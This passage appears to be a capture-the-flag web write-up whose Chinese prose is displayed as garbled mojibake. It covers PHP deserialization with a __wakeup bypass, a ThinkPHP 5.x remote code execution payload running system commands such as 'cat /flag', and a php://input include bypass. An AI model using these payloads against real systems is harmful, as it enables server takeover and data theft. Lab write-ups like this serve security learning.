<p>phpä¸­<u><strong>ç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œé¦–å…ˆè¿è¡Œwakeup()å‡½æ•°</strong></u>ï¼Œ</p>
<p>åœ¨<u><strong>åºåˆ—åŒ–æ—¶å…ˆè¿è¡Œsleep()å‡½æ•°</strong></u>,</p>
<p>åœ¨<u><strong>ååºåˆ—åŒ–æ—¶å…ˆè¿è¡Œwakeup()</strong></u>ï¼Œ</p>
<p>åœ¨<u><strong>è„šæœ¬ç»“æŸè°ƒç”¨destruct()å‡½æ•°</strong></u>ã€‚ </p>
<p>ç»§ç»­å®¡è®¡ä»£ç ï¼Œä¸‹é¢çš„<code>if</code>è¯­å¥ä¸­ï¼Œå…ˆç”¨äº†<code>base64</code>çš„è§£ç å‡½æ•°ï¼Œè¿›è¡Œäº†ä¸€æ¬¡è§£ç ï¼Œåˆç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤ï¼Œåªæœ‰<code>base64</code>ç¼–ç å¹¶é€šè¿‡æ­£åˆ™è¡¨ç¤ºå¼æ‰èƒ½è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="/post/wp-Gongfang/image-20231004231043515.png" alt="image-20231004231043515"></p>
<p>è¿™é‡Œçš„æ­£åˆ™è¡¨è¾¾å¼<code>â€™/[oc]:\d+:/iâ€™</code> è¡¨ç¤ºäº†<code>ä»¥Oæˆ–è€…Cå¼€å¤´</code>æ¥ï¼šæ¥æ•°å­—ï¼Œæ•°å­—è‡³å°‘å‡ºç°ä¸€æ¬¡æˆ–è€…æ— æ•°æ¬¡ï¼Œå¿½ç•¥å¤§å°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†<code>O:4æ”¹ä¸ºO:+4</code>åˆ™å¯é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œå› ä¸ºåœ¨PHPä»£ç é‡Œï¼Œ<code>+4</code>å°±æ˜¯<code>4</code>ï¼Œæ‰€ä»¥ç»•è¿‡äº†æ­£åˆ™åŒ¹é…åŒæ—¶ä¹Ÿä¸å½±å“ä»£ç æ­£å¸¸å«ä¹‰</p>
<p>è¿™é‡Œçœ‹åˆ°äº†<code>fl4g.php</code>ï¼Œå…ˆæŠŠå®ƒå®ä¾‹åŒ–ï¼Œè¿™é‡Œæ”¹ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘å°±åœ¨æƒ³ï¼Œå¦‚æœè¿™ä¸ªå®ä¾‹åŒ–çš„æ—¶å€™()ä¸åŠ å‚æ•°ï¼Œé‚£ä¹ˆæœ€ååºåˆ—åŒ–çš„ç»“æ„åªèƒ½æ˜¯index.phpï¼Œä¹Ÿå°±æ˜¯æºç ä¸­çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç›®æ ‡æ˜¯fl4g.phpè¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="comment">//è¿™é‡Œå…¶å®åªéœ€è¦åœ¨å®ä¾‹åŒ–ç±»ä¸­ï¼Œä¼ å…¥æˆ‘ä»¬éœ€è¦åºåˆ—åŒ–çš„å‚æ•°å³å¯</span></span><br><span class="line"><span class="comment">//è¿™é‡Œç›¸å½“äºç»™$flieèµ‹å€¼ï¼Œå¦‚æœç±»ä¸­å¤šä¸ªå€¼éœ€è¦å˜æˆæˆ‘ä»¬éœ€è¦çš„å‚æ•°ï¼Œç”¨&quot;,&quot;éš”å¼€å³å¯ï¼ŒæŒ‰èµ‹å€¼é¡ºåºï¼Œä¾‹å¦‚$a = new Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://tool.lu/coderunner/">è¿è¡ŒPHPä»£ç </a></p>
<p>å¾—åˆ°<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª<code>__wakeup</code>ï¼Œæ‰€ä»¥è¿˜è¦æ”¹ä¸€ä¸‹å±æ€§å€¼<code>1ä¸º2</code></p>
<p>â€“&gt;</p>
<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œæœ‰ä¸€ä¸ªå¤§å‘è®©æˆ‘å¡äº†å¥½ä¹…</p>
<p>å…ˆçœ‹ä¸‹é¢è¿™ä¸ªå›¾ç†è§£ä¸€ä¸‹ä¸Šé¢çš„è¯­å¥</p>
<p><img src="/post/wp-Gongfang/image-20231004231058765.png" alt="image-20231004231058765"></p>
<p>å±æ€§å€¼ä¸º10ï¼Œä½†æ˜¯â€<code>Demofile</code>â€œåªæœ‰8ä¸ªå­—ç¬¦ï¼Œå¾ˆæ˜æ˜¾ç¼ºäº†ä¸¤ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å´è¢«çœç•¥äº†ï¼ŒçŒœæµ‹ç¡®äº†<strong>ä¸¤ä¸ªç©ºå­—ç¬¦</strong></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š<span class="number">0</span>çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¹Ÿå¯ä»¥æ¨æµ‹å‡ºDemofileæ˜¯<span class="keyword">private</span>å£°æ˜</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä¸€ç›´å¡ä½çš„<u>åŸå› å°±æ˜¯æŠŠç©ºå­—ç¬¦å½“ä½œäº†ç©ºæ ¼</u></p>
<p>æ‰€ä»¥å¼€å§‹æˆ‘æ˜¯ç›´æ¥åœ¨Då’Œfå‰åŠ ä¸Šç©ºæ ¼ï¼Œä½†æ˜¯åº•ä¸‹çš„base64ç¼–ç æäº¤urlæ²¡æœ‰ååº”</p>
<p><img src="/post/wp-Gongfang/image-20220628214059503.png" alt="image-20220628214059503"></p>
<p>ç„¶åæŠŠdecoderæ¢æˆhexï¼Œå‘ç°ç©ºæ ¼æ˜¯20ï¼ˆ44æ˜¯å­—æ¯Dï¼Œ66æ˜¯å­—æ¯fï¼‰</p>
<p><img src="/post/wp-Gongfang/image-20220628233504338.png" alt="image-20220628233504338"></p>
<p>ç„¶åçœ‹äº†ä¸‹é¢è¿™ä¸ªè¡¨ï¼Œæ˜ç™½00æ‰æ˜¯ç©ºå­—ç¬¦ï¼Œç©ºæ ¼å’Œç©ºå­—ç¬¦ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿</p>
<p><img src="/post/wp-Gongfang/image-20220628213218629.png" alt="image-20220628213218629"></p>
<p>ä½†æ˜¯ç©ºå­—ç¬¦æ— æ³•å¤åˆ¶ï¼Œåœ¨å¤åˆ¶æ—¶ï¼Œç©ºå­—ç¬¦åçš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ï¼Œåªå¤åˆ¶äº†ç©ºå­—ç¬¦å‰é¢çš„å­—ç¬¦ä¸²</p>
<p>æ‰€ä»¥è¿™é‡Œå¯ä»¥åœ¨hexé‡Œç›´æ¥æ”¹ï¼ŒæŠŠ20æ”¹æˆ00</p>
<p><img src="/post/wp-Gongfang/image-20220628233851825.png" alt="image-20220628233851825"></p>
<p>ç„¶åä¸‹æ–¹çš„base64ç¼–ç å°±å¯ä»¥äº†</p>
<p>è®¿é—®</p>
<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-é¢˜ç›®æè¿°-16"><a href="#1-é¢˜ç›®æè¿°-16" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹ç•Œé¢å¦‚ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220630174402928.png" alt="image-20220630174402928"></p>
<p>ï¼ˆçœ‹åˆ°thinkphpæˆ‘å°±æƒ³èµ·ä»Šå¹´å›½èµ›ä¹Ÿæœ‰ä¸€é“think PHPçš„é¢˜ï¼Œçˆ†0ï¼Œéº»äº†ï¼‰</p>
<p>è¿™é‡Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<a href="../../../../2022/05/28/Web-study">rce</a>å’Œè¯¥æ¼æ´çš„æˆå› </p>
<p>å¦‚æœè¿™é‡Œç‰ˆæœ¬çš„thinkphpå­˜åœ¨rceçš„æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡æŒ‡ä»¤è·å–flag</p>
<p>ç™¾åº¦å¯çŸ¥</p>
<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31ç‰ˆæœ¬åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡è¯¥æ¼æ´å¯èƒ½å®Œå…¨æ§åˆ¶WebæœåŠ¡å™¨ã€‚</code> </p>
<p>ç„¶ååœ¨Githubä¸Šæœthinkphpå¾—åˆ°<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
<p><img src="/post/wp-Gongfang/image-20220630174951670.png" alt="image-20220630174951670"></p>
<p>å°è¯•<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>äº†è§£åˆ°æœ€åçš„idå¤„ä¸ºå‘½ä»¤æ‰§è¡Œè¯­å¥è¾“å…¥å¤„ï¼Œç”¨ findè¯­å¥æŸ¥çœ‹æœ‰æ²¡æœ‰flagæ–‡ä»¶</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
<p><img src="/post/wp-Gongfang/image-20220630175318946.png" alt="image-20220630175318946"></p>
<p>å¾—åˆ°çš„ç»“æœå¾ˆä¹±ï¼Œç”¨F12æ•´æ´ä¸€äº›</p>
<p>æœ€åè¡Œï¼Œçœ‹åˆ°flagæ–‡ä»¶å¤¹</p>
<p><img src="/post/wp-Gongfang/image-20220630175432667.png" alt="image-20220630175432667"></p>
<p>ç”¨catæ˜¾ç¤ºå‡ºæ¥</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-é¢˜ç›®æè¿°-17"><a href="#1-é¢˜ç›®æè¿°-17" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">phpä¼ªåè®®</a></p>
<p>çœ‹åå­—å¾ˆæ¸…æ¥šæ˜¯åˆ°æ–‡ä»¶åŒ…å«çš„é¢˜ç›®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆåˆ†æä¸€ä¸‹å‡½æ•°</p>
<p><code>strstr()ï¼š</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å›falseã€‚</code><br><code>åŒºåˆ†å¤§å°å†™ï¼Œstristr()å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™</code><br><code>è¯­æ³•ï¼š</code><br><code>strstr(string,search,before_search)</code><br><code>string:å¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>search:å¿…éœ€ï¼Œè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢å¯¹åº”çš„ASCIIå€¼çš„å­—ç¬¦</code><br><code>before_searchï¼šå¯é€‰ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ï¼Œè‹¥ä¸ºtrue,å°†è¿”å›searchå‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†</code></p>
<p><code>str_replace():</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>ä»¥å…¶å®ƒå­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</code><br><code>è¯­æ³•ï¼š</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,å¿…éœ€ï¼Œè¦æŸ¥æ‰¾çš„å€¼</code><br><code>replaceï¼Œå¿…éœ€ï¼Œè¦æ›¿æ¢çš„å€¼</code><br><code>stringï¼Œå¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>countï¼Œå¯é€‰ï¼Œæ›¿æ¢æ¬¡æ•°</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœpage&#x3D;çš„å†…å®¹é‡Œæœ‰php:&#x2F;&#x2F;å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤</p>
<p>ä½†æ˜¯çœ‹æºç æˆ‘ä»¬çŸ¥é“ï¼Œå®ƒåªè¿‡æ»¤äº†å°å†™ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„php:&#x2F;&#x2F;input</p>
<p>*è¿™é“é¢˜å¥½åƒåŒ…æ‹¬php:&#x2F;&#x2F;inputï¼Œæœ‰5ç§æ–¹æ³•ï¼Œå»ºè®®çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_includeæ€»ç»“äº”ç§è§£æ³•å¤§åŒå°å¼‚</a></p>
<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>
<p>php:&#x2F;&#x2F;inputè¯»å–POSTæ•°æ®ï¼Œ æˆ‘å…ˆç”¨hackbarï¼Œå‘ç°æ²¡æœ‰ååº”</p>
<p><img src="/post/wp-Gongfang/image-20220626215410026.png" alt="image-20220626215410026"></p>
<p>çœ‹äº†ä¸€ç¯‡å¤§ä½¬çš„wpï¼Œè¯´æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸è¡Œ</p>
<p>ä½†è¿™é‡Œå¯ä»¥ç”¨burpè¯•è¯•ï¼Œå¾—åˆ°flagæ–‡ä»¶å</p>
<p>fl4gisisish3r3.php</p>
<p><img src="/post/wp-Gongfang/image-20220626222916776.png" alt="image-20220626222916776"></p>
<p>æ˜¾ç¤ºfl4gisisish3r3.phpå†…å®¹</p>
<p><img src="/post/wp-Gongfang/image-20220626223253399.png" alt="image-20220626223253399"></p>
<p>å¾—åˆ°flag</p>
<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-é¢˜ç›®æè¿°-18"><a href="#1-é¢˜ç›®æè¿°-18" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>éšä¾¿æ³¨</p>
<h3 id="2ï¼‰wp-3"><a href="#2ï¼‰wp-3" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜ä¹‹å‰åœ¨buuctfä¸Šåšè¿‡ï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œwpå¯ä»¥åœ¨<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>çœ‹ä¸€ä¸‹</p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-é¢˜ç›®æè¿°-19"><a href="#1-é¢˜ç›®æè¿°-19" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-4"><a href="#2ï¼‰wp-4" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å¼€å§‹å°±åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå…ˆçœ‹ä¸€ä¸‹å®ƒæºç </p>
<p><img src="/post/wp-Gongfang/image-20220703104834305.png" alt="image-20220703104834305"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªsource.phpæ–‡ä»¶</p>
<p>è®¿é—®<code>http://111.200.241.244:59132/source.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__å¸¸é‡è¿”å›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åï¼Œé«˜äº®æ˜¾ç¤º</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//ç™½åå•</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœä¼ çš„å‚æ•°ä¸æ˜¯ç©ºçš„ï¼Œå¹¶ä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œè°ƒç”¨checkFileå‡½æ•°è¿”å›ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//å¯¹ä¼ æ¥çš„å‚æ•°è¿›è¡ŒåŒ…å«</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//å¦åˆ™å°±è¾“å‡ºå›¾ç‰‡</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰flagçš„çº¿ç´¢ï¼Œä½†çœ‹åˆ°ä¸€ä¸ªhint.phpæ–‡ä»¶</p>
<p>è®¿é—®<code>http://111.200.241.244:59132/hint.php</code></p>
<p><img src="/post/wp-Gongfang/image-20220703105453437.png" alt="image-20220703105453437"></p>
<p>çŸ¥é“äº†flagåœ¨ffffllllaaaaggggæ–‡ä»¶é‡Œ</p>
<p>ç„¶åå¼€å§‹åˆ†æsource.phpä»£ç ï¼ˆå¯ä»¥çœ‹çœ‹æºç æ³¨é‡Šï¼‰</p>
<p>åˆ†æï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äº checkfile å‡½æ•°ï¼Œè¦è®©å®ƒè¿”å›ä¸ºtureæ‰èƒ½å¤Ÿå®ç°æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å˜é‡æ˜¯fileï¼Œ<u>pageå˜é‡å®é™…æ˜¯fileå˜é‡çš„å½¢å‚ï¼Œç”±checkfileå‡½æ•°ä¼ è¿‡å»</u>ï¼Œä¹Ÿå°±æ˜¯fileå˜é‡è¦æ»¡è¶³æ‰€æœ‰çš„ifæ¡ä»¶ï¼Œæ‰èƒ½è¿”å›tureè€Œä¸æ˜¯åªæ˜¾ç¤ºå›¾ç‰‡</p>
<p>å…ˆåˆ†æcheckfileå‡½æ•°é‡Œçš„å››ä¸ªifæ¡ä»¶æ»¡è¶³è¦æ±‚ï¼Œé¿å…æ‰§è¡Œreturn false</p>
<p>ç¬¬ä¸€ä¸ªif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

